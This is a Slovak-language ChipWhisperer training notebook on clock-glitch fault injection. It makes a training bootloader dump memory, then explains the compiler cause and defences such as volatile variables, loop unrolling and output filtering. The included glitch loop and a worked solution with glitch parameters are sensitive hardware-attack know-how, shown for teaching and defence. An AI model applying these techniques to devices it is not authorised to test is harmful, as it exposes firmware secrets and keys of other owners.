# Časť 1, Téma 3: Vkladanie chýb do hodinového signálu (Clock Glitching) na výpis pamäte (MAIN)

---
POZNÁMKA: Toto praktické cvičenie odkazuje na niektoré (komerčné) školiace materiály na webe [ChipWhisperer.io](https://www.ChipWhisperer.io). Cvičenie môžete voľne spustiť a používať v súlade s licenciou open-source (vrátane jeho použitia vo vašich vlastných kurzoch, ak ich budete distribuovať podobným spôsobom), musíte však zachovať informáciu o tomto pôvodnom zdroji. Ak si chcete vyskúšať plnohodnotný zážitok, zvážte účasť na našom školení.

---

**ZHRNUTIE:** *V predchádzajúcom cvičení sme sa naučili, ako sa dá použiť clock glitching na to, aby mikrokontrolér preskočil kontrolu hesla. V tomto cvičení sa pozrieme na to, či dokážeme narušiť realistickejší cieľ: odozvu na príkaz v bootloaderi.*

**VÝSLEDKY VZDELÁVANIA:**

* Aplikovanie predchádzajúcich nastavení glitchovania na nový firmvér
* Kontrola úspechu a zlyhania pri glitchovaní
* Pochopenie toho, ako môžu optimalizácie kompilátora spôsobiť, že sa zariadenia správajú zvláštnym spôsobom

## Situácia

Teraz, keď sme si už glitchovanie trochu vyskúšali, pokúsime sa o niečo realistickejšie: „zašifrovaný“ bootloader (v skutočnosti je to len šifra ROT13, ale budeme predstierať, že ide o neprekonateľné šifrovanie), pričom budeme pracovať s čo najmenším počtom predpokladov. Naším cieľom bude prinútiť bootloader, aby dáta dešifroval a poslal nám ich späť. O bootloaderi vieme nasledovné:

1. Príkaz `'p'` sa používa na zápis zašifrovaného firmvéru do zariadenia. Ako vstup prijíma zašifrovaný reťazec zakódovaný v ASCII, zakončený znakom nového riadka. Náš prvý blok firmvéru je `"516261276720736265747267206762206f686c207a76797821"`.
1. Bootloader s ním *niečo* urobí (pravdepodobne ho dešifruje, overí jeho autenticitu atď. a zapíše ho do pamäte).
1. Pošle späť chybový kód v tvare `"r000000\n"`.

Tento chybový kód nás okamžite zaujíma. Je to jediný moment, kedy s nami bootloader spätne komunikuje, takže zaútočiť práve tam je dobré miesto na začiatok. Budeme predpokladať, že máme k dispozícii trigger (spúšťač) tesne pred tým, ako sa nám chybový kód odošle späť. Ide o jednoduché volanie `trigger_high()`, ale mohli by sme spúšťať akciu aj na základe linky IO (čo je lepšie s CW1200 Pro) alebo pomocou SAD triggera na výkonovej stope (iba CW1200 Pro). Máme kde začať, ale poďme sa najprv o bootloaderi dozvedieť viac.

Na toto cvičenie odporúčame použiť SimpleSerial V2. Hoci firmvér nepoužíva samotný protokol simpleserial, vyššia prenosová rýchlosť (baud rate) pomôže urýchliť proces glitchovania.

In [ ]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWLITEXMEGA'
SS_VER="SS_VER_2_1"

In [ ]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../firmware/mcu/bootloader-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE -j SS_VER=$2

In [ ]:
%run "../Setup_Scripts/Setup_Generic.ipynb"

In [ ]:
fw_path = "../../firmware/mcu/bootloader-glitch/bootloader-{}.hex".format(PLATFORM)

In [ ]:
cw.program_target(scope, prog, fw_path)

Prvá vec, ktorú urobíme, je jednoduchá analýza odberu prúdu (power analysis), aby sme zistili, čo zariadenie robí, keď nám posiela dáta späť. Sériová komunikácia je pomerne pomalá, preto nastavte ChipWhisperer na zachytenie približne 24-tisíc vzoriek s hodinovým signálom ADC typu "x1".

In [ ]:
def reboot_flush():            
    reset_target(scope)
    #Flush garbage too
    target.flush()
scope.clock.adc_src = "clkgen_x1"
reboot_flush()
scope.adc.samples = 24000

Ďalej zaznamenajte výkonovú stopu (power trace). Odoslaním reťazca `"p516261276720736265747267206762206f686c207a76797821\n"` odošlete bootloaderu prvý blok kódu a vykreslíte ho do grafu. Ak neuvidíte celú sériovú správu, môžete zvýšiť hodnotu `scope.adc.decimate`, čím sa zahodí každá n-tá vzorka ADC.

In [ ]:
scope.adc.timeout = 3
scope.arm()
target.write("p516261276720736265747267206762206f686c207a76797821\n")
ret = scope.capture()
if ret:
    print("Timeout")
trace = scope.get_last_trace()


cw.plot(trace)

Nevyzerá to, že by sa tu dialo niečo mimoriadne zložité – pravdepodobne len vypisuje nejaké znaky v cykle. Pár nápadov:

* Ak vložíme chybu na začiatku cyklu, mohlo by sa nám podariť poškodiť premennú dĺžky cyklu a prinútiť zariadenie vypísať dodatočnú pamäť.
* Mohlo by sa nám podariť poškodiť samotnú riadiacu premennú cyklu a dosiahnuť, aby čítal nad rámec toho, kde by mal.

V prípade SimpleSerial V2 by to malo byť dostatočne krátke na to, aby ste mohli rýchlo prejsť celým kódom. Ak váš cieľ nepoužíva SimpleSerial V2, mali by ste namiesto toho vybrať rozsah približne 1000 cyklov pred koncom cyklu. Ak to neuspeje, môžete skúsiť zacieliť na cykly na začiatku cyklu.

**POMÔCKA: Posledná časť cyklu by sa mala nachádzať blízko začiatku poslednej výkonovej špičky.**

**POMÔCKA: Ak si naozaj neviete rady s tým, kde končí sériový výpis, môžete zistiť čas medzi volaním `trigger_high()` a `trigger_low()` pomocou `scope.adc.trig_count`.**

In [ ]:
glitch_spots = [i for i in range(???)]
# ###################
# Add your code here
# ###################
raise NotImplementedError("Add your code here, and delete this.")

In [ ]:
print(glitch_spots)

<details>
<summary>Nejaké riešenie</summary>
<pre><code>
    glitch_spots = list(range(0, scope.adc.trig_count, 1))
</code></pre>
</details>

### Vyhodnotenie úspechu

Zistiť, či bola naša chyba úspešná, nie je také triviálne ako v predchádzajúcom cvičení – nemáme k dispozícii žiadnu peknú chybovú návratovú hodnotu, ktorú by zariadenie vypočítalo a poslalo nám ju späť. Jedným z nápadov je hľadať časť reťazca, ktorý sme zariadeniu poslali: medzi naším odoslaním a vrátením chybového kódu neubehne veľa času. S trochou šťastia kompilátor umiestnil obe hodnoty v pamäti blízko seba.

Zvyšok je už na vás! Použite to, čo ste sa naučili v predchádzajúcom cvičení, na konfiguráciu nastavení glitchovania a vytvorenie glitchovacej slučky. Tu je niekoľko tipov, ktoré vám to uľahčia:

1. Skúste použiť pomerne malý rozsah šírky (width) a posunu (offset), keďže tu budeme musieť skenovať aj externý posun (`ext_offset`). Celkový rozsah okolo ~2-3 pre každý s krokmi 0.4 je dobrý cieľový rozsah. 
1. Na overenie úspechu skúste hľadať časť reťazca, ktorý sme poslali do zariadenia.
1. Možno budete chcieť vynechať vykresľovanie grafov alebo vykresľovať iba úspechy/pády, ak by to proces výrazne spomaľovalo – skenujeme veľký rozsah nastavení glitchovania, takže budeme potrebovať maximálnu možnú rýchlosť.

Nastavte svoje glitchovanie tu:

In [ ]:
scope.adc.timeout = 0.1

scope.cglitch_setup()

def my_print(text):
    for ch in text:
        if (ord(ch) > 31 and ord(ch) < 127) or ch == "\n": 
            print(ch, end='')
        else:
            print("0x{:02X}".format(ord(ch)), end='')
        print("", end='')

Na zjednodušenie nastavenia slučky môžeme opäť použiť Glitch Controller:

In [ ]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
gc.display_stats()

In [ ]:
x_bound = (-48, 48)
y_bound = (glitch_spots[0], glitch_spots[-1])
if scope._is_husky:
    x_bound = gc.set_range("width", 3900, 4500)
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None}, x_bound=x_bound, y_bound=y_bound,
               x_index="width", y_index="ext_offset")

In [ ]:
# replace with good glitch settings you've found
gc.set_range("width", ???, ???)
gc.set_range("offset", ???, ???)
gc.set_global_step(???)

gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1])
gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])
gc.set_range("tries", 1, 1)
gc.set_step("tries", 1)
gc.set_step("ext_offset", 1)
scope.glitch.repeat = 1

    
for glitch_setting in gc.glitch_values():
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    scope.glitch.ext_offset = glitch_setting[2]
    if broken:
        break
    if scope.adc.state:
        #print("Timeout, trigger still high!")
        gc.add("reset")
        #Device is slow to boot?
        reboot_flush()
        
    target.flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")
 
        #Device is slow to boot?
        reboot_flush()
    else:
        time.sleep(0.05)
        output = target.read(timeout=2)
        if ??? in output:
            print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width))
            gc.add("success")
            broken = True 
            for __ in range(500):
                num_char = target.in_waiting()
                if num_char:
                    my_print(output)
                    output = target.read(timeout=50)
            time.sleep(1)
            break
        else:
            gc.add("normal")

<details>
<summary>Nejaké riešenie</summary>
<pre><code>
    # replace with good glitch settings you've found
#gc.set_range("width", 2, 14)
#gc.set_range("offset", -14, 14)
gc.set_range("width", 46, 49.8)
gc.set_range("offset", -46, -49.8)
gc.set_global_step(0.4)

gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1])
gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])
gc.set_range("tries", 1, 1)
gc.set_step("tries", 1)
gc.set_step("ext_offset", 1)
scope.glitch.repeat = 1

broken = False
for glitch_setting in gc.glitch_values():
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.width = glitch_setting[0]
    scope.glitch.ext_offset = glitch_setting[2]
    if broken:
        break
    if scope.adc.state:
        #print("Timeout, trigger still high!")
        gc.add("reset")
        #Device is slow to boot?
        reboot_flush()
        
    target.flush()
    scope.arm()
    target.write("p516261276720736265747267206762206f686c207a76797821\n")
    ret = scope.capture()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        time.sleep(0.05)
        output = target.read(timeout=2)
        if "767" in output:
            print("Glitched!\n\tExt offset: {}\n\tOffset: {}\n\tWidth: {}".format(scope.glitch.ext_offset, scope.glitch.offset, scope.glitch.width))
            gc.add("success")
            broken = True 
            for __ in range(500):
                num_char = target.in_waiting()
                if num_char:
                    my_print(output)
                    output = target.read(timeout=50)
            time.sleep(1)
            break
        else:
            gc.add("normal")
</code></pre>
</details>

## Diagnostika chyby

Ako môžete vidieť z výstupu, bootloader utrpel pomerne katastrofálne zlyhanie! Nielenže vyzradil tajomstvo, ale navyše vypísal aj veľké množstvo ďalšej pamäte. V prípade skutočného bootloaderu by sa tam pravdepodobne nachádzali veľmi zaujímavé informácie, ako napríklad šifrovacie kľúče alebo predtým dešifrovaný firmvér. Začnime tým, že sa pozrieme na zdrojový kód v jazyku C, ktorý odosiela chybový kód späť:

```C
trigger_high();

int i;
for(i = 0; i < ascii_idx; i++)
{
    putch(ascii_buffer[i]);
}
trigger_low();
state = IDLE;
```

Na prvý pohľad tu nevyzerá nič nezvyčajne. Skôr než sa pozrieme na assembler a zistíme, čo presne zlyhalo, skúsme si tipnúť:

* Možno chyba poškodila premennú `ascii_idx`.
    * K narušeniu došlo blízko konca cyklu. Je nepravdepodobné, že by sa hodnota ukončovacieho počítadla cyklu počas jeho priebehu znova načítavala.
* Možno sme preskočili poslednú kontrolu `i < ascii_idx`.
    * Chyba spôsobila výpis **obrovského** množstva pamäte. Ak by sme len preskočili poslednú kontrolu, malo by to vypísať iba jeden znak naviac.
* Premenná `i` je celočíselný typ so znamienkom (signed integer): možno sme ju poškodili tak, že sa zmenila na veľmi veľké záporné číslo.

Táto posledná možnosť sa zdá byť našou najlepšou teóriou, takže sa budeme držať jej.

## Odpoveď

Poďme skontrolovať assembler nášho bootloaderu. Netreba binárny súbor dekompilovať ani znova kompilovať do assembleru, pretože v rámci procesu zostavenia sa vytvára aj súbor s výpisom (`*.lss`). Tento súbor obsahuje aj kód v C, takže sa v ňom ľahko vyhľadáva (skúste nájsť napríklad volanie `trigger_high()`). Môžete si všimnúť, že namiesto porovnania „menší alebo rovný“ alebo „menší než“, ktoré bolo v našom C kóde, kompilátor namiesto toho vložil porovnanie „nerovná sa“ (`not equal`)! To znamená, že náš pôvodný odhad nemusel byť správny, keďže náš predpoklad o tom, čo by sa stalo pri preskočení poslednej kontroly `i < ascii_idx`, neplatí. V skutočnosti je oveľa pravdepodobnejšie, že bola preskočená posledná kontrola (alebo bola premenná `i` nastavená na nejakú veľkú hodnotu), než že by došlo k preklopeniu jedného konkrétneho bitu.

Toto je zo strany kompilátora pomerne nečakaná zmena, najmä preto, že inštrukcie „menší než“, „väčší než“ a „nerovná sa“ sú z hľadiska implementácie takmer identické a majú rovnakú veľkosť inštrukcie aj rýchlosť vykonania. To poukazuje na dôležitý fakt: kód v jazyku C, ktorý napíšete, sa neprekladá priamo do assembleru 1:1. Musí najprv prejsť kompilátorom, ktorý môže drasticky zmeniť zamýšľanú logiku programu.

Teraz, keď už vieme, čo sa stalo, pozrime sa na niekoľko spôsobov, ako to napraviť.

### 1. Premenné typu Volatile

Jazyk C obsahuje pre premenné kľúčové slovo `volatile`, ktoré signalizuje, že hodnota premennej sa môže medzi jednotlivými prístupmi zmeniť, a preto by sa na ňu nemali aplikovať žiadne optimalizácie. Typickým príkladom použitia `volatile` sú registre periférií na zabudovaných (embedded) zariadeniach. Bolo by napríklad veľmi zlé, keby ste v kóde čakali na to, kým IO pin prejde do logickej jednotky, ale kompilátor by sa rozhodol, že bude rýchlejšie skontrolovať ho iba raz a predpokladať, že sa už nemení!

Skúste nahradiť riadok `int i = 0;` pred cyklom výpisu textom `volatile int i = 0;`, znova kód skompilujte a skontrolujte súbor s výpisom (`*.lss`). Nastali nejaké ďalšie nečakané zmeny? Čo ak vezmete do úvahy vyššie uvedený príklad použitia (t. j. ak by bolo `i` registrom namiesto premennej cyklu)? Existuje spôsob, ako by tento útok mohol stále fungovať? Ak áno, ako by ste ho mohli zmierniť?

### 2. Rozvinutie cyklu (Loop unrolling)

Ďalším potenciálnym spôsobom riešenia tohto problému by mohlo byť manuálne rozvinutie cyklu. Správa, ktorú bootloader vypisuje, má konštantnú dĺžku 7 znakov, takže by sme namiesto toho mohli napísať:

```C
int i;
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
putch(ascii_buffer[i++]);
```

V skutočnosti je to niečo, čo by kompilátor mohol urobiť sám od seba v rámci optimalizácie kódu, pretože takéto rozvinutie cyklu je rýchlejšie ako verzia s cyklom. Nie je však dobré sa na to slepo spoliehať, pretože kompilátor sa môže rozhodnúť túto optimalizáciu nevykonať a môže ju medzi jednotlivými zostaveniami (buildmi) meniť.

### 3. Kontrola neplatných znakov

Ďalšia vec, ktorú treba zvážiť, je, že správa z bootloaderu obsahuje iba obmedzený rozsah znakov, ktoré reálne vypisuje. Mohli by sme preto vytvoriť funkciu pre „bezpečný výpis“ (safe print), ktorá vytlačí iba nové riadky, znak `'r'` a ASCII číslice (t. j. od `'0'` do `'9'`):

```C
int safe_print(char c)
{
    if ((c == '\n') ||
       ((c >= '0') && (c <= '9')) ||
       (c == 'r')) {
        putch(c);
        return 0;
    }
    return -1; //och joj!
}
```

Ak by sme sa vybrali touto cestou, bolo by dobré vytvoriť chybovú návratovú hodnotu ako samostatný buffer s množstvom nulových znakov na konci.


In [ ]:
scope.dis()
target.dis()